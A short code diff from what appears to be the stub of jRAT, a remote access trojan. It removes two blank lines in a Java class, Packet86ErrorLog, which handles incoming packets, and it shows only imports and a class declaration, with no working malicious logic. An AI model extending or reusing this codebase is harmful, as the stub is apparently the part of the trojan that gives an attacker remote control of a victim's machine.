@@ -8,8 +8,6 @@ import pro.jrat.stub.Main;
 import pro.jrat.stub.packets.outgoing.Packet65ErrorLog;
 import pro.jrat.stub.utils.Utils;
 
-
-
 public class Packet86ErrorLog extends AbstractIncomingPacket {
 
 	@Override
